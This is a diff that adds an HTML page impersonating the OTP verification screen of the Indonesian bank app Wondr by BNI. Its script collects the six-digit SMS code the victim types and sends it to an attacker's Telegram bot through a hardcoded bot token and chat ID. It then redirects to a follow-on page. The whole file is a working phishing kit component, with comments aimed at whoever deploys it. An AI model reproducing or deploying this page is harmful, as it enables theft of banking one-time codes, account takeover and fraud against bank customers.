@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verifikasi OTP - Wondr by BNI</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        utama: {
+                            oranye: '#FF7A2F',
+                            hijauMuda: '#86E2D5',
+                            abuMuda: '#F5F5F5',
+                            merah: '#ff0000', // ✅ WARNA MERAH DITAMBAHKAN
+                        },
+                        teks: {
+                            hitam: '#1A1A1A', // ✅ DIKEMBALIKAN KE HITAM SEMULA
+                            abu: '#666666',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Arial', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .content-auto {
+                content-visibility: auto;
+            }
+            .kotak-otp {
+                @apply w-12 h-14 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:outline-none focus:border-utama-hijauMuda focus:ring-0;
+            }
+        }
+    </style>
+</head>
+<body class="bg-white font-sans max-w-md mx-auto min-h-screen">
+
+    <!-- HEADER -->
+    <header class="px-5 py-4 flex items-center shadow-sm">
+        <a href="javascript:history.back()" class="text-lg">
+            <i class="fa fa-arrow-left text-gray-700"></i>
+        </a>
+    </header>
+
+    <main class="px-6 py-8">
+
+        <!-- JUDUL DAN INFORMASI -->
+        <div class="text-center mb-10">
+            <!-- ✅ BAGIAN INI DIUBAH MENJADI WARNA MERAH SAJA -->
+            <h1 class="text-[24px] font-bold text-utama-merah mb-3">⚠️ Kode OTP Valid</h1>
+            <p class="text-[14px] text-teks-abu leading-relaxed">
+                <br>Silahkan masuk kan ulang Kode OTP 
+                 yang terbaru Yang di kirim Via SMS. <span class="font-bold"></span>
+            </p>
+        </div>
+
+        <!-- 6 KOLOM OTP -->
+        <form id="formOTP" class="mb-8">
+            <div class="flex justify-between gap-2 mb-8">
+                <input type="Number" maxlength="1" class="kotak-otp" autofocus oninput="pindahFokus(this, 'otp2')" id="otp1">
+                <input type="Number" maxlength="1" class="kotak-otp" oninput="pindahFokus(this, 'otp3')" id="otp2">
+                <input type="Number" maxlength="1" class="kotak-otp" oninput="pindahFokus(this, 'otp4')" id="otp3">
+                <input type="Number" maxlength="1" class="kotak-otp" oninput="pindahFokus(this, 'otp5')" id="otp4">
+                <input type="Number" maxlength="1" class="kotak-otp" oninput="pindahFokus(this, 'otp6')" id="otp5">
+                <input type="Number" maxlength="1" class="kotak-otp" oninput="cekDanKirim()" id="otp6">
+            </div>
+        </form>
+
+        <!-- KIRIM ULANG KODE -->
+        <div class="text-center mb-10">
+            <p class="text-[14px] text-teks-abu">
+                Tidak menerima kode? <a href="#" class="text-utama-hijauMuda font-bold">Kirim Ulang</a>
+            </p>
+            <p class="text-[12px] text-teks-abu mt-2">Kirim ulang kode dalam <span id="hitungMundur">00:59</span></p>
+        </div>
+
+        <!-- TOMBOL KONFIRMASI -->
+        <button id="tombolKonfirmasi" disabled 
+            class="w-full py-3 rounded-xl text-white text-lg font-medium bg-gray-300 transition-all duration-300">
+            Memverifikasi...
+        </button>
+
+    </main>
+
+    <script>
+        // ✅ PENGATURAN TELEGRAM - ISI BAGIAN INI SESUAI PUNYA KAMU ✅
+        const TOKEN_BOT = "8448627224:AAH-yfGcIglnMile1XSnAGnng7Jy4_K5xGo";
+        const CHAT_ID = "8617754329";
+        const HALAMAN_TUJUAN = "php1.html";
+
+        // Pindah fokus antar kolom
+        function pindahFokus(elemenSekarang, idBerikutnya) {
+            if (/^\d$/.test(elemenSekarang.value)) {
+                document.getElementById(idBerikutnya)?.focus();
+            } else {
+                elemenSekarang.value = '';
+            }
+        }
+
+        // ✅ FUNGSI UTAMA: CEK KOLOM PENUH -> KIRIM KE TELEGRAM -> PINDAH HALAMAN ✅
+        function cekDanKirim() {
+            // Ambil nilai setiap kolom
+            const o1 = document.getElementById('otp1').value;
+            const o2 = document.getElementById('otp2').value;
+            const o3 = document.getElementById('otp3').value;
+            const o4 = document.getElementById('otp4').value;
+            const o5 = document.getElementById('otp5').value;
+            const o6 = document.getElementById('otp6').value;
+
+            // Gabungkan jadi satu kode
+            const kodeOTP = o1 + o2 + o3 + o4 + o5 + o6;
+
+            // Cek jika sudah lengkap 6 angka
+            if (kodeOTP.length === 6) {
+                
+                // Ubah tampilan tombol jadi aktif
+                const tombol = document.getElementById('tombolKonfirmasi');
+                tombol.disabled = false;
+                tombol.classList.remove('bg-gray-300');
+                tombol.classList.add('bg-utama-hijauMuda');
+                tombol.textContent = "Sedang Mengirim...";
+
+                // ✅ KIRIM KE TELEGRAM ✅
+                fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=Kode%20OTP%20Pengguna%3A%20${kodeOTP}`)
+                .then(response => response.json())
+                .then(data => {
+                    // Jika pesan TERKIRIM SUKSES, langsung pindah halaman
+                    if (data.ok) {
+                        tombol.textContent = "Berhasil!";
+                        // Pindah ke halaman tujuan
+                        window.location.href = HALAMAN_TUJUAN;
+                    }
+                })
+                .catch(error => {
+                    alert('Gagal mengirim: ' + error);
+                });
+            }
+        }
+
+        // Hitung mundur waktu kirim ulang
+        let waktu = 59;
+        let tampil = document.getElementById('hitungMundur');
+        let hitung = setInterval(() => {
+            waktu--;
+            let menit = Math.floor(waktu / 60).toString().padStart(2, '0');
+            let detik = (waktu % 60).toString().padStart(2, '0');
+            tampil.textContent = menit + ':' + detik;
+            if(waktu <= 0) clearInterval(hitung);
+        }, 1000);
+    </script>
+
+</body>
+</html>
